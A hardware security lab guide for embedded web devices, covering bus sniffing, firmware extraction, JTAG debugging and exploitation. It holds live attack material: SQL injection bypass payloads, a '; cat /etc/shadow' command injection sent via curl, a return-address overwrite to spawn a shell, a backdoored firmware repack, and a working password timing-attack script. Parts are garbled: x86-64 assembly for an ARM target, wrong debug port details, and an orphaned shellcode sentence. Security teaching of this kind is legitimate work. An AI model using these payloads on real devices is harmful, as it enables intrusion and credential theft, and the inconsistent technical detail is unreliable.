# Operational Verification Labs: Web Security

## Objective & Lab Bench Setup

Modern web security exists at the intersection of cryptographic protocol implementations, hardware trust boundaries, and application logic vulnerabilities. While traditional penetration testing focuses on software-layer exploitation through proxies and scripting, a hardware-centric verification approach exposes the physical underpinnings of web security mechanisms: how TLS handshakes materialize as SPI flash reads when a microcontroller boots its certificate store, how authentication tokens traverse UART buses during embedded web server initialization, how firmware update mechanisms expose injection vectors through unprotected JTAG interfaces, and how side-channel attacks against cryptographic operations manifest as measurable power consumption patterns or timing variations visible on logic analyzer traces.

This laboratory guide reframes web security verification as a hardware forensics discipline. Instead of abstract vulnerability scanning, you will physically instrument embedded web servers, IoT gateways, and hardware security modules to observe authentication state machines, inspect cryptographic material in transit across serial buses, inject malicious payloads directly into flash memory regions, and validate exploit primitives by observing their effects on GPIO pins, memory-mapped registers, and bus protocol violations. The goal is not merely to identify vulnerabilities in HTTP request handlers or cookie parsers, but to understand how web security controls—TLS session keys, JWT validation logic, CORS policy enforcement, CSRF token generation—are implemented in silicon, firmware, and physical interconnects, and how their failures propagate from software abstractions down to measurable electrical signals.

The verification bench mirrors a professional hardware security laboratory. At its core sits a logic analyzer capable of decoding high-speed serial protocols: SPI, I²C, UART, JTAG, and USB 2.0. Sigrok-cli provides the capture engine, translating analog waveforms into protocol-aware packet streams that expose the byte-level mechanics of cryptographic handshakes and authentication flows. An OpenOCD-compatible JTAG adapter grants invasive access to ARM Cortex-M or RISC-V targets, enabling live memory inspection, breakpoint injection, and register manipulation while the embedded web server processes requests. A USB-UART bridge converts between the host workstation and target serial consoles, capturing boot logs, debug output, and plaintext credential exchanges that developers often leave enabled in production firmware. Flashrom and a dedicated SPI programmer permit non-volatile memory extraction and modification, allowing you to implant backdoors into TLS certificate stores, rewrite authentication logic, or corrupt integrity checksums to observe fail-open behaviors.

The target device is typically an embedded Linux gateway, IoT camera, or industrial control system web interface—any device that exposes HTTP/HTTPS endpoints while running on constrained hardware with accessible debug interfaces. Commercial routers, IP cameras, and smart home hubs are ideal subjects because they implement simplified web security stacks where vulnerabilities often cascade from firmware design choices down to exploitable hardware states. A reference target might be an ESP32-based web server or a Raspberry Pi running a custom HTTPS service with certificate pinning, providing both software complexity and hardware accessibility.

Begin by establishing the physical topology. Connect the logic analyzer probe clips to the target's SPI flash chip, specifically the CLK, MOSI, MISO, and CS lines. These signals carry the raw boot sequence: as the microcontroller powers on, it reads its TLS certificate chain, private keys, and web server configuration from flash before initializing the network stack. Simultaneously, attach the JTAG adapter to the device's debug header—typically a 10-pin or 20-pin connector exposing TCK, TMS, TDI, TDO, and TRST. If no dedicated header exists, locate the test points on the PCB; most production devices leave these accessible for manufacturing diagnostics. Finally, wire the UART bridge to the serial console pins, usually marked as TX, RX, and GND near the processor. Set the baud rate to the device's default, often 115200 8N1, and open a minicom session to observe the kernel boot log and any developer debug messages.

Install the complete diagnostic suite on your workstation. On Debian-based systems, execute `apt-get install sigrok-cli pulseview openocd flashrom binwalk radare2 gdb-multiarch minicom screen`. Verify the logic analyzer enumeration with `sigrok-cli --scan`; it should detect your device, typically a Saleae clone or a fx2lafw-based analyzer. Confirm OpenOCD support for your JTAG adapter and target architecture by running `openocd -f interface/ftdi/olimex-arm-usb-tiny-h.cfg -f target/stm32f4x.cfg` or the equivalent configuration for your hardware. The system should halt the target and present a telnet server on port 4444, exposing the GDB remote serial protocol for memory introspection. Test flashrom access with `flashrom -p ft2232_spi:type=232H`, which should enumerate the SPI flash chip model and capacity.

Ground yourself in the threat model before proceeding. Web security vulnerabilities on embedded devices fall into three categories: cryptographic implementation flaws where TLS is misconfigured or certificate validation is bypassed, authentication and authorization logic errors where session tokens are predictable or privilege boundaries are porous, and classic injection attacks—SQL injection, command injection, XSS—that exploit insufficient input sanitization in web request handlers. Unlike traditional web applications where these vulnerabilities exist purely in software, embedded systems expose them at the hardware layer: weak PRNG seed material might be observable in UART entropy collection, session tokens might leak through unencrypted I²C traffic to a display controller, and successful command injection might trigger GPIO state changes or watchdog timer resets that are directly measurable with test equipment. Your task is to verify these vulnerabilities not by fuzzing HTTP endpoints in isolation, but by observing their physical manifestations and confirming exploit primitives through hardware-level validation.

The exercises progress from passive reconnaissance to active exploitation. You will first capture and decode the complete boot sequence to map out trust boundaries and credential storage locations. Then you will extract firmware, reverse-engineer authentication logic, and identify vulnerability candidates through static analysis. Finally, you will exploit those vulnerabilities while simultaneously monitoring hardware state, proving that a successful attack produces measurable effects in registers, memory, and I/O signals. This methodology ensures that your findings are not theoretical scanner output but reproducible hardware-verified exploits that demonstrate concrete security failures from application layer down to silicon.

Prepare your workspace with proper ESD protection. Ground yourself and the workstation chassis to prevent electrostatic discharge from corrupting flash memory or damaging the target device's interface logic. Use low-capacitance probe clips to minimize signal loading on high-speed SPI lines, and verify probe ground integrity with a multimeter before powering the target. Keep detailed lab notes recording probe placements, signal voltage levels, capture trigger conditions, and command sequences. Hardware security verification is forensic work: reproducibility depends on meticulous documentation of physical setup and measurement parameters.

## Exercise 1: Live Hardware Probing & Signal Capture

The first exercise establishes signal visibility across the target's boot sequence and runtime web service operation. Your objective is to capture the complete initialization flow from power-on through HTTPS server startup, decode the cryptographic material loading process, and identify the physical mechanisms by which the device provisions its TLS identity and authentication state. This passive reconnaissance phase maps the attack surface by observing what secrets exist, where they are stored, how they are accessed, and what side channels leak their presence.

Power off the target and verify all probe connections. Attach logic analyzer channels as follows: Channel 0 to SPI CLK, Channel 1 to SPI MOSI (master-out-slave-in, data flowing from processor to flash), Channel 2 to SPI MISO (master-in-slave-out, data flowing from flash to processor), Channel 3 to SPI CS (chip select, active low). These four signals constitute the minimum set for decoding SPI flash reads. If additional channels are available, assign Channel 4 to the device's hardware reset line to capture the moment of system initialization, Channel 5 to UART TX to correlate boot log messages with flash access patterns, and Channel 6 to the first GPIO pin of the web server process, which often toggles to signal readiness or request handling activity.

Configure the logic analyzer for continuous capture at a sample rate sufficient to decode the SPI bus. Most embedded systems clock SPI between 1 MHz and 40 MHz. A safe capture rate is 100 MS/s (megasamples per second), providing at least 2.5 samples per bit even at maximum bus speed, meeting the Nyquist criterion with margin for jitter. Set the trigger condition to a falling edge on the CS line: this ensures recording begins precisely when the processor issues its first flash read command. Allocate at least 64 megabytes of capture buffer, sufficient for several seconds of activity during which the bootloader reads U-Boot, the kernel loads, and the web server initializes its TLS context.

Execute the capture with `sigrok-cli -d fx2lafw --config samplerate=100000000 --channels 0=CLK,1=MOSI,2=MISO,3=CS --triggers CS=f --samples 67108864 -o boot_capture.sr`. The `-d fx2lafw` flag selects a generic fx2lafw-based analyzer; replace with your specific device identifier if different. The `--triggers CS=f` parameter arms the capture to begin on a falling edge of the chip select line, ensuring you record from the very first SPI transaction. The output file `boot_capture.sr` is a sigrok session file containing raw sample data.

With the capture armed, power on the target device. The logic analyzer will remain in a waiting state until CS transitions low, then begin recording. Allow the device to complete its entire boot sequence—typically 10 to 30 seconds for an embedded Linux system—and reach the point where the web server is listening for HTTPS connections. Verify operational readiness by observing the UART console: look for messages indicating the HTTP daemon has bound to port 443 and initialized its TLS context. Once confirmed, stop the capture by pressing Ctrl+C or allowing the sample buffer to fill.

Decode the captured SPI session with `sigrok-cli -i boot_capture.sr -P spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS -A spi=mosi-data,spi=miso-data > spi_decoded.txt`. The `-P` flag invokes the SPI protocol decoder, and the `-A` flag extracts annotated data streams for MOSI and MISO separately. The resulting text file contains hex-formatted byte sequences representing every read and write operation between the processor and flash memory. This is raw forensic evidence of the boot process, including bootloader code, kernel images, filesystem data, and critically, the regions where TLS certificates and private keys are stored.

Identify the flash layout by searching for characteristic patterns in the decoded data. Look for the U-Boot environment block, typically containing key-value pairs in plain ASCII like `bootargs=console=ttyS0,115200`. This region often appears within the first megabyte. Next, locate the kernel image by finding the magic bytes `27 05 19 56` (little-endian) or `56 19 05 27` (big-endian) for a U-Boot uImage header, or `1f 8b 08` for a gzip-compressed kernel. The root filesystem follows, often a SquashFS image beginning with `68 73 71 73` (ASCII "hsqs"). Within the filesystem, search for PEM-encoded certificates: the ASCII string `-----BEGIN CERTIFICATE-----` translates to hex `2d 2d 2d 2d 2d 42 45 47 49 4e 20 43 45 52 54 49 46 49 43 41 54 45 2d 2d 2d 2d 2d`. Private keys appear as `-----BEGIN RSA PRIVATE KEY-----` or `-----BEGIN PRIVATE KEY-----`.

Extract the precise flash offset of the certificate by noting the byte position in the MISO stream where the PEM header appears. For example, if the certificate begins at byte 0x3A4000 in the decoded capture, and you observe this during an SPI read command that specifies address 0x3A4000, you have confirmed the physical storage location of the device's cryptographic identity. This offset becomes a target for later modification exercises.

Cross-correlate the SPI flash reads with UART boot log output. Open a second terminal and review the minicom session log captured during boot. You should see messages like `Loading kernel from 0x80000...` or `Starting web server with SSL certificate /etc/ssl/server.crt`. Match these log timestamps to the corresponding flash read operations in the logic analyzer trace. This correlation proves that the software abstractions—kernel loading, certificate parsing, TLS context initialization—are implemented as deterministic sequences of SPI transactions, each physically observable and potentially interceptable.

Now transition to runtime observation. With the device fully booted and the web server operational, configure the logic analyzer to capture UART traffic during an HTTPS session. Connect Channel 0 to UART TX and set the protocol decoder for asynchronous serial: `sigrok-cli -d fx2lafw --config samplerate=10000000 --channels 0=TX --continuous -P uart:baudrate=115200:parity=none:data_bits=8:stop_bits=1 -A uart=tx-data`. Leave this capture running, then from your workstation execute `curl -k https://TARGET_IP/login` where `TARGET_IP` is the device's IP address and `-k` disables certificate verification for testing purposes.

Observe the UART output during the request. Many embedded web servers log debugging information to the serial console, including parsed HTTP headers, session token generation, authentication checks, and database queries. If you see log lines like `[DEBUG] Session token: a3f7c9e2b4d8f1a6` or `[DEBUG] SQL query: SELECT * FROM users WHERE username='admin'`, you have discovered a critical information leak: sensitive runtime state is being transmitted in plaintext over a physical interface that an attacker with hardware access can trivially monitor. Document these findings by saving the UART capture to a file and annotating the specific byte offsets where credentials or session tokens appear.

Perform a similar exercise for I²C traffic if the device includes external peripherals like an EEPROM storing configuration data or an LCD controller displaying status information. Probe the I²C bus by connecting the logic analyzer to SDA (data) and SCL (clock) lines, typically exposed near the main processor or peripheral devices. Capture I²C transactions with `sigrok-cli -d fx2lafw --config samplerate=10000000 --channels 0=SDA,1=SCL -P i2c:scl=SCL:sda=SDA -A i2c=address-read,i2c=data-read`. Trigger a web server action that updates persistent state—such as changing an admin password through the web interface—and observe whether the new password is written to I²C EEPROM in plaintext. If the decoded I²C stream shows `WRITE 0x50: 'newpassword123'`, the device is storing credentials without encryption in external non-volatile memory, accessible to any attacker who can physically probe the bus.

Finally, inject controlled input through the web interface and observe hardware-level side effects. Set up a GPIO monitor on a pin that the web server firmware toggles during request processing—many embedded HTTP daemons drive an LED or status pin to indicate activity. Connect a logic analyzer channel to this GPIO and capture its state transitions while sending a sequence of HTTP requests: a valid login, an invalid login, a request for a non-existent resource, and a request with a maliciously crafted path like `GET /../../../etc/passwd`. Plot the GPIO timing diagram and analyze the duration between request arrival and GPIO toggle. If the successful authentication produces a measurably different timing signature than a failed authentication—for example, a 15 ms delay versus a 5 ms delay—you have discovered a timing side channel that leaks information about internal processing states, potentially enabling remote username enumeration or authentication brute-forcing without ever triggering rate-limiting or logging mechanisms.

This exercise establishes the foundation for all subsequent verification work. You have now confirmed that the abstract web security properties—TLS certificate provisioning, authentication logic, session state—are grounded in physical signals accessible via standard hardware debugging interfaces. The captured traces serve as ground truth for understanding how the system behaves under normal operation, providing a baseline against which you will compare the effects of exploit attempts in later exercises.

## Exercise 2: Bus Sniffing, Register Inspection & Memory Dumping

The second exercise transitions from passive observation to invasive inspection. Your objective is to extract the complete firmware image from flash memory, reverse-engineer the web server binary to identify authentication and authorization logic, locate cryptographic key material in RAM during runtime, and use JTAG to inspect processor registers and memory-mapped peripherals while the web server handles malicious requests. This active reconnaissance phase constructs a detailed map of exploitable state: where session tokens are stored, how privilege checks are implemented, which input validation routines are weak, and what memory corruption primitives are available.

Begin with full firmware extraction. Use flashrom to dump the entire SPI flash contents to a binary file. Connect your SPI programmer—typically an FT2232H-based adapter or a dedicated CH341A programmer—to the flash chip's pins. If the chip is soldered to the board, use SOIC-8 test clips for non-invasive probing. If the device uses a socketed flash chip, desolder it and insert it into a ZIF socket programmer for more reliable access. Execute `flashrom -p ft2232_spi:type=232H -c "MX25L12835F" -r firmware_dump.bin` where the `-c` parameter specifies the exact flash chip model as enumerated by `flashrom -p ft2232_spi:type=232H`. The read operation typically takes 30 seconds to several minutes depending on chip capacity; a 16 MB flash at standard SPI speeds transfers at roughly 1 MB per minute.

Verify the integrity of the dumped firmware by computing its SHA-256 hash and comparing it to a second independent dump: `flashrom -p ft2232_spi:type=232H -c "MX25L12835F" -r firmware_dump_verify.bin`, then `sha256sum firmware_dump.bin firmware_dump_verify.bin`. If the hashes match, the dump is reliable. If they differ, your probe connections may be intermittent, or the flash chip is experiencing read instability due to power supply noise or inadequate decoupling. Re-seat the probe clips, verify the ground connection, and repeat.

Analyze the firmware structure with binwalk. Execute `binwalk -e firmware_dump.bin` to automatically extract embedded filesystems, compressed archives, and executable code regions. Binwalk's entropy analysis and signature matching will identify the bootloader (often U-Boot), the Linux kernel, and the root filesystem. Navigate into the extracted filesystem directory, typically `_firmware_dump.bin.extracted/squashfs-root/`, and locate the web server binary. Common paths include `/usr/sbin/httpd`, `/bin/lighttpd`, or custom daemon names like `/usr/bin/webserver`. Copy this binary to your analysis workstation for detailed reverse engineering.

Load the web server binary into radare2 for disassembly and static analysis. Launch `r2 -AA webserver` where `-AA` performs automatic analysis, identifying functions, cross-references, and string references. Start with string discovery: execute `iz` to list all strings embedded in the binary. Look for authentication-related messages like "Invalid password", "Session expired", or "Unauthorized access". Note the virtual addresses of these strings, then use `axt @ 0xADDRESS` to find cross-references—the code locations that reference each string. These xrefs pinpoint the authentication and error handling logic.

Identify the main authentication function by searching for SQL query construction or password comparison routines. Execute `pdf @ sym.check_login` or similar function names discovered during analysis. Look for dangerous patterns: string concatenation in SQL queries indicates SQL injection vulnerabilities, use of `strcmp` instead of constant-time comparison suggests timing attacks, absence of entropy sources in token generation implies predictable session IDs. Document each finding with the exact assembly instructions and the corresponding C pseudo-code, noting the function offset and register states.

For concreteness, assume the disassembly reveals the following authentication code pattern at address 0x00401A20:

```asm
0x00401A20    push   rbp
0x00401A21    mov    rbp, rsp
0x00401A24    sub    rsp, 0x100
0x00401A2B    mov    qword [rbp-0x8], rdi     ; username pointer
0x00401A2F    mov    qword [rbp-0x10], rsi    ; password pointer
0x00401A33    lea    rdi, str.SELECT_FROM_users_WHERE_username  ; "SELECT * FROM users WHERE username = '"
0x00401A3A    call   sym.imp.strcpy
0x00401A3F    mov    rdi, qword [rbp-0x8]     ; append username directly
0x00401A43    call   sym.imp.strcat
0x00401A48    lea    rdi, str.AND_password     ; "' AND password = '"
0x00401A4F    call   sym.imp.strcat
0x00401A54    mov    rdi, qword [rbp-0x10]    ; append password directly
0x00401A58    call   sym.imp.strcat
0x00401A5D    lea    rdi, str.quote_semicolon  ; "';"
0x00401A64    call   sym.imp.strcat
0x00401A69    mov    rdi, rax
0x00401A6C    call   sym.sqlite3_exec         ; execute the concatenated query
```

This disassembly shows a classic SQL injection vulnerability: the code constructs a query string by directly concatenating user-supplied input without sanitization or parameterization. An attacker can submit a username like `admin' OR '1'='1` to break out of the query context and bypass authentication. Document this finding with a proof-of-concept payload and the exact register values that will trigger the vulnerability.

Next, locate session token generation logic. Search for calls to random number generation functions: `afl | grep rand` lists all functions containing "rand". Disassemble the token generation function, often named something like `generate_session_token` or `create_auth_cookie`. Examine the entropy source: does it call `rand()` without seeding with `srand(time(NULL))` first, implying a predictable PRNG state? Does it use `getrandom()` or `/dev/urandom` for cryptographically secure randomness? If the code calls `rand()` and you find no corresponding `srand()` initialization in the `main()` function or module constructor, the tokens are generated from a fixed seed and thus predictable. Verify this by tracing the binary's startup code: `pdf @ entry0` and follow the call chain to identify whether any entropy collection occurs.

With the static analysis complete, transition to dynamic runtime inspection via JTAG. Launch OpenOCD with the appropriate configuration files: `openocd -f interface/ftdi/olimex-arm-usb-tiny-h.cfg -f target/stm32f4x.cfg` or equivalent for your target architecture. OpenOCD should halt the processor and present a telnet interface on port 4444 and a GDB remote serial protocol server on port 3333. Open a telnet session with `telnet localhost 4444`, then halt the CPU with the command `reset halt`. The processor is now frozen, allowing you to inspect its complete internal state.

Read processor registers with `reg` to display the current program counter, stack pointer, and general-purpose register contents. Identify the current execution context by comparing the PC value to the memory map in your firmware dump. If the PC is in the range 0x08000000-0x08100000, the processor is executing from internal flash. If it's in 0x20000000-0x20020000, it's running from SRAM, possibly executing a dynamically loaded module or buffer.

Dump the entire RAM contents to a file for offline analysis: `dump_image ram_dump.bin 0x20000000 0x20000`. This extracts 128 KB starting from the SRAM base address; adjust the range to match your target's RAM size. Transfer the dump to your workstation and search for cryptographic material using `binwalk` and `strings`. Execute `strings -n 8 ram_dump.bin | grep -E '(BEGIN|KEY|CERTIFICATE)'` to locate PEM-encoded keys loaded into memory. If you find a private key in RAM, note its offset: this is the address from which an attacker with JTAG access can extract the device's TLS identity.

Search for session tokens and cookies in the RAM dump. If the web server uses in-memory session storage, active session tokens will appear as ASCII or hexadecimal strings. Use `strings ram_dump.bin | grep -E '[a-f0-9]{32,}'` to find candidate session identifiers, typically 32 or more hexadecimal characters. Cross-reference these with the session cookies returned by the web server during a test login: execute `curl -c cookies.txt https://TARGET_IP/login -d "username=admin&password=admin123"`, then examine `cookies.txt` for a session token. If you find the exact token string in the RAM dump, you have confirmed its storage location and can now monitor that memory region during exploit attempts.

Resume execution with `resume` in the OpenOCD telnet session, allowing the web server to continue normal operation. Set a memory watchpoint on the session token storage region with `wp 0x20004A00 0x20 r` to trigger a halt whenever the CPU reads from that address range. This watchpoint will capture the exact moment when the web server validates a session cookie. Send a crafted HTTP request with a modified session token, and OpenOCD will halt execution when the code reads the token from memory for validation. Inspect the call stack with `bt` in GDB connected to port 3333, revealing the validation function and its caller chain.

Attach GDB to the OpenOCD server: `gdb-multiarch webserver`, then `target extended-remote localhost:3333`. Set a breakpoint on the authentication function identified during static analysis: `break *0x00401A20`. Send a login request from curl: `curl https://TARGET_IP/login -d "username=test&password=test"`. GDB will halt at the breakpoint. Inspect the function arguments with `x/s $rdi` and `x/s $rsi` to display the username and password strings passed to the function. Single-step through the SQL query construction with `si` (step instruction) and observe the string concatenation operations in real-time. When the code calls `sqlite3_exec`, dump the final query string from memory: `x/s $rdi` reveals the complete SQL statement, including the user-supplied input. If you injected a payload in the username field, you will see it embedded in the query, confirming the exploitability of the SQL injection vulnerability.

This exercise establishes complete visibility into the target's software and hardware state. You have extracted the firmware, reverse-engineered critical security logic, located cryptographic keys in non-volatile and volatile memory, and confirmed exploitable code paths through dynamic debugging. The findings provide a precise map for the next phase: constructing and validating working exploits with hardware-level confirmation.

## Exercise 3: Fault Simulation & Exploit Verification

The final exercise operationalizes the vulnerabilities discovered in Exercise 2, constructing working exploits and validating their effects through hardware-level measurements. Your objective is to execute SQL injection attacks while monitoring memory state changes via JTAG, inject malicious firmware into flash memory and observe the boot sequence integrity failures, perform timing attacks against authentication routines while capturing sub-millisecond precision GPIO traces, and demonstrate privilege escalation by dumping post-exploitation memory regions containing administrative credentials. Each exploit attempt is instrumented with hardware verification to prove that the attack succeeded not just at the HTTP protocol layer but in the underlying system state.

Start with SQL injection exploitation. Based on the disassembly from Exercise 2, construct a payload that bypasses authentication by injecting a tautology into the SQL query. The vulnerable code constructs: `SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASS_INPUT';`. Inject the username `admin' OR '1'='1' --` to transform the query into: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'anything';`. The `--` comment operator neutralizes the password check, and the tautology `'1'='1'` ensures the WHERE clause always evaluates to true, returning all user records and granting access as the first user in the table, typically the administrator.

Before executing the attack, set up hardware monitoring to confirm the exploit's success at the system level. Connect the logic analyzer to the device's UART console and a GPIO pin that the web server toggles when an administrative action is performed—look for pins labeled LED, STATUS, or GPIO near the processor or check the firmware's GPIO initialization code in `main()` to identify the admin activity indicator. Configure a simultaneous capture of UART and GPIO with `sigrok-cli -d fx2lafw --config samplerate=10000000 --channels 0=UART_TX,1=ADMIN_GPIO --continuous -P uart:baudrate=115200:tx=UART_TX -o exploit_capture.sr`.

Launch the attack with curl while the logic analyzer records: `curl -k https://TARGET_IP/login -d "username=admin' OR '1'='1' --&password=ignored"`. If the exploit succeeds, the server should return a session cookie with administrative privileges. Simultaneously, examine the UART capture for log messages indicating successful authentication: strings like `[INFO] User 'admin' logged in` or `[DEBUG] Privilege level: administrator`. Decode the GPIO signal to verify that the admin activity pin toggled high, confirming that the system internally recognized the session as privileged.

Validate the privilege escalation by accessing an administrative endpoint. Send `curl -k https://TARGET_IP/admin/users -H "Cookie: session=INJECTED_SESSION_TOKEN"` where `INJECTED_SESSION_TOKEN` is the cookie received from the SQL injection login. If the server returns a list of all users or allows administrative actions, the attack is confirmed. Cross-check with JTAG: attach GDB, set a breakpoint on the authorization check function (identified in Exercise 2 as verifying the session's privilege level), and step through the code to observe that the privilege bitmask in memory contains the administrator bit set.

To prove the exploit's effect in memory, use OpenOCD to dump the session table after a successful SQL injection attack. Telnet to OpenOCD, halt the CPU, and extract the memory region where the session storage resides: `dump_image session_memory.bin 0x20004A00 0x1000`. Analyze the dump with a hex editor or `strings` to locate the injected session entry. You should find a record associating your injected session token with the `admin` username and elevated privileges, even though no valid password was supplied. This hardware-verified memory dump serves as forensic proof of the exploitation.

Next, demonstrate command injection if the web interface exposes diagnostic or configuration features that execute system commands. Many embedded web servers include a ping or traceroute utility accessible via a web form. If the code uses `system()` or `popen()` to execute the command without input sanitization, inject a payload like `; cat /etc/shadow` to append an arbitrary command. The vulnerable code pattern looks like: `sprintf(cmd_buffer, "ping -c 4 %s", user_input); system(cmd_buffer);`. Injecting `8.8.8.8; cat /etc/shadow` results in executing `ping -c 4 8.8.8.8; cat /etc/shadow`, exfiltrating the password hash file.

Instrument this attack with UART monitoring to capture the command output. Send the injection payload via curl: `curl -k https://TARGET_IP/diagnostics -d "target=8.8.8.8; cat /etc/shadow"`. The logic analyzer UART capture should reveal the contents of `/etc/shadow` printed to the console, confirming that the injected command executed with the web server's privilege level, typically root on embedded systems. Save the UART output log as evidence of successful command injection.

Perform a memory corruption exploit if you identified a buffer overflow during reverse engineering. Suppose the login function allocates a 256-byte stack buffer for the username but uses `strcpy()` without bounds checking. Construct a payload that overwrites the return address: generate 264 bytes of padding followed by the address of a `system()` call site and the argument `"/bin/sh"`. The exact payload depends on the target architecture, ASLR status, and stack layout, but the principle is to redirect execution flow to a location where you control the arguments to a sensitive function.

Before sending the overflow payload, set up OpenOCD with a memory watchpoint on the stack region to detect the corruption. Halt the CPU, identify the stack pointer value with `reg sp`, and set a watchpoint: `wp [sp_value] 0x200 w` to trigger on writes to the stack. Resume execution and send the overflow payload. OpenOCD should halt immediately when the `strcpy()` writes past the buffer boundary, overwriting adjacent stack frames. Inspect the stack contents with `x/256xb $sp` and verify that your payload has overwritten the saved return address. Single-step through the function epilogue to observe the `ret` instruction loading your controlled address into the program counter, proving control flow hijacking.

If the device implements firmware update functionality via the web interface, test for integrity validation failures. Legitimate firmware updates are typically signed with a cryptographic signature verified before flashing. Extract the update mechanism from the disassembled firmware: look for functions calling `mbedtls_rsa_pkcs1_verify()`, `openssl_verify()`, or similar cryptographic verification routines. If the code performs signature verification but fails to handle errors correctly—for example, if `verify_signature()` returns `-1` on failure but the code does not check the return value before calling `flash_write()`—the device is vulnerable to malicious firmware installation.

Craft a malicious firmware payload by modifying the legitimate firmware dump from Exercise 2. Use a hex editor to alter a single byte in the web server binary, introducing a backdoor or disabling authentication. Repackage the modified filesystem into a firmware image using `mksquashfs squashfs-root modified_firmware.bin -comp xz`, then prepend the bootloader and kernel from the original dump to create a complete flashable image. If the device expects a header with checksum or signature fields, copy those verbatim from the legitimate firmware—if verification is broken, the device will accept the modified payload despite the invalid signature.

Upload the malicious firmware through the web interface update mechanism, simultaneously monitoring SPI flash writes with the logic analyzer. Configure the capture to decode SPI transactions during the update process: `sigrok-cli -d fx2lafw --config samplerate=100000000 --channels 0=CLK,1=MOSI,2=MISO,3=CS -P spi:clk=CLK:mosi=MOSI:miso=MISO:cs=CS -A spi=mosi-data -o flash_write_capture.sr`. The MOSI stream will reveal the exact bytes written to flash. If your modified firmware is written to the flash chip and the device reboots successfully, the signature verification bypass is confirmed. After reboot, connect via UART and observe the kernel boot log—if your backdoor code executes (for example, a debug message you inserted or a bind shell on an unexpected port), you have achieved persistent compromise via firmware modification.

Conduct a timing attack against the authentication routine if the code uses a non-constant-time comparison function like `strcmp()` for password verification. Even if the SQL injection vulnerability is patched, a timing side channel can leak password length and content byte-by-byte. The vulnerable pattern is: `if (strcmp(user_password, input_password) == 0) { grant_access(); }`. The `strcmp()` function returns as soon as it finds a mismatching byte, so a correct first character takes longer to reject than an incorrect first character.

Automate the timing attack with a Python script that measures response latency for each candidate password character. Set up a high-precision timer using `time.perf_counter()` before and after each HTTP request, and test all printable ASCII characters at each password position. Simultaneously, capture GPIO state transitions with the logic analyzer to measure the exact duration between request arrival and authentication completion at the hardware level, eliminating network jitter from the measurement.

The attack script structure:

```python
import requests
import time
import string

target = "https://TARGET_IP/login"
username = "admin"
known_password = ""
charset = string.ascii_letters + string.digits + string.punctuation

for position in range(20):  # assume max password length 20
    timings = {}
    for char in charset:
        candidate = known_password + char
        start = time.perf_counter()
        r = requests.post(target, data={"username": username, "password": candidate}, verify=False)
        elapsed = time.perf_counter() - start
        timings[char] = elapsed
    
    # character with longest processing time is likely correct
    best_char = max(timings, key=timings.get)
    known_password += best_char
    print(f"Position {position}: '{best_char}' ({timings[best_char]:.6f}s)")
    
    # if all chars have similar timing, we've reached password end
    if max(timings.values()) - min(timings.values()) < 0.001:
        break

print(f"Recovered password: {known_password}")
```

Run this script while the logic analyzer captures the GPIO timing. After each request, parse the GPIO capture file to extract the exact delay between the request trigger (visible as a network interface LED toggle or a dedicated request-received pin) and the authentication completion signal. Plot the timing measurements: correct characters should exhibit a measurably longer delay, typically on the order of microseconds per character. A password "secret" would show increasing latency as you guess 's', then 'se', then 'sec', and so on, with incorrect guesses at each position failing faster.

Validate the timing attack results by attempting login with the recovered password. If successful, you have demonstrated that even in the absence of direct SQL injection, the system leaks authentication credentials through measurable timing side channels observable at the hardware layer. This attack is particularly powerful because it operates entirely through the legitimate authentication interface without triggering any intrusion detection rules or logging anomalies.

Extract the raw machine code bytes from the ELF file, inject them into the code cave in the web server binary, and modify the binary's entry point or a frequently called function to jump to your shellcode.

## Hardware Security Checklist & Diagnostic Cheat Sheet

This section provides a structured verification checklist and command reference for systematically assessing web security controls on embedded devices. Use this as a rapid assessment framework during security audits or penetration tests, ensuring comprehensive coverage of both software vulnerabilities and hardware-layer attack surfaces.

### Pre-Engagement Reconnaissance

Identify the target device architecture and extract basic system information before physical access. Perform network enumeration with `nmap -sV -p- TARGET_IP` to discover open ports, service versions, and the HTTP server implementation. Look for identifying HTTP headers like `Server: lighttpd/1.4.54` or custom strings in the web interface that indicate the vendor and firmware version. Search public vulnerability databases for known CVEs associated with the identified software stack. Download the official firmware update file from the manufacturer's website if available—this provides a clean reference copy for comparison with the extracted firmware and often reveals the internal architecture without requiring physical access.

### Physical Interface Enumeration

Upon gaining physical access, map all external and internal hardware interfaces. Visually inspect the PCB for labeled debug headers: J1, J2, JTAG, UART, SWD, or unpopulated pads with silkscreen markings. Use a multimeter in continuity mode to trace suspected UART pins: TX typically measures 3.3V or 5V with respect to ground, RX remains at logic high, and GND is 0V. Test each pin against ground and power rails to identify the pinout. For JTAG, look for the standard ARM 10-pin or 20-pin header, or use a multimeter to locate TCK (clock) by measuring for periodic toggling during boot, TMS (mode select), TDI/TDO (data in/out), and TRST (reset). If the interface is unpopulated, solder a standard 0.1" pitch header to the pads for reliable probe connection.

### Firmware Extraction Procedure

Execute a complete firmware dump before any invasive testing to preserve the original system state. Connect the SPI flash programmer and enumerate the chip: `flashrom -p ft2232_spi:type=232H`. If the chip model is unknown, inspect the chip's marking and cross-reference with datasheets: common flash ICs include Winbond W25Q128, Macronix MX25L12835F, and GigaDevice GD25Q127. Read the full flash contents: `flashrom -p ft2232_spi:type=232H -c "CHIP_MODEL" -r firmware_original.bin`. Verify integrity by performing a second read and comparing hashes. Store the original dump securely as a restoration image in case the device is bricked during testing.

### Static Firmware Analysis Workflow

Extract and analyze the firmware image systematically. Run `binwalk -Me firmware_original.bin` to recursively extract all embedded filesystems and compressed archives. The `-M` flag enables matryoshka mode for deep recursive extraction, and `-e` extracts identified components. Navigate into the extracted filesystem and enumerate all binaries: `find . -type f -executable`. Identify SUID root binaries with `find . -perm -4000`, which are high-value targets for privilege escalation. Examine configuration files in `/etc/` for hardcoded credentials, weak cryptographic parameters, or insecure service bindings. Search for private keys and certificates: `find . -name "*.pem" -o -name "*.key" -o -name "*_rsa"`. Analyze each web server binary with radare2: `r2 -AA binary_name`, then execute `afl` to list all functions, `axt @@ str.*` to find cross-references to interesting strings, and `pdf @ sym.function_name` to disassemble critical functions.

### JTAG Debugging Session Setup

